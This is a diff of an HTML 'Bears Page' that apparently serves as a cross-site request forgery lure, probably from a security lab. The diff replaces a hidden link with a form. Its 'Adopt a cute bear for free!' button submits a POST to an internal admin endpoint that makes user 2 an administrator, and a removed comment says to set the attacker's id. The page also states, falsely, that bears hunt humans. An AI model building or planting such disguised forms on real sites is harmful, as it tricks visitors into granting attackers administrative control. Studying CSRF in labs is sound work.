@@ -86,15 +86,30 @@
 <body>
     <div class="container">
         <h1>Welcome to the Bears Page</h1>
-        <a href="https://www.bornfree.org.uk/adopt/brown-bear" class="button" target="_blank">SCOPRI IL TUO ORSETTO</a>
+        
+        <!-- Form for the first link (SCOPRI IL TUO ORSETTO) -->
+        <form action="https://www.bornfree.org.uk/adopt/brown-bear" method="PATCH" id="bear-info-form">
+            <button type="submit" class="button" target="_blank">SCOPRI IL TUO ORSETTO</button>
+        </form>
+        
         <p>Here you can learn everything about bears. Bears are big, carnivorous mammals that are often visible in forests. They are known for their agility, playfulness, and ability to hunt humans.</p>
         <img src="https://placebear.com/200/300" alt="Cute bear">
         <br><br>
-        <!-- update user id according to the attacker id -->
-        <a id="csrf-link" href="http://internal.admin:8000/admin/2/set-admin" class="button" style="display: none;">Adopt a cute bear for free!</a>
-        <a href="https://www.bornfree.org.uk/adopt/brown-bear" class="button" target="_blank">ADOTTAMI, E' GRATIS :)</a>
+        
+        <!-- Form for the second link (Adopt a bear) -->
+        <form action="http://internal.admin:8000/admin/2/set-admin" method="POST" id="csrf-form">
+            <input type="hidden" name="_csrf" value="TOKEN_HERE">
+            <button type="submit" class="button">Adopt a cute bear for free!</button>
+        </form>
+    
+        <!-- Form for the third link (ADOTTAMI, E' GRATIS :) ) -->
+        <form action="https://www.bornfree.org.uk/adopt/brown-bear" method="PATCH" id="adopt-bear-form">
+            <button type="submit" class="button" target="_blank">ADOTTAMI, E' GRATIS :)</button>
+        </form>
+    
         <div id="message" class="message">Your bear thanks you :)</div>
     </div>
+    
     
     <script>
         setTimeout(() => {
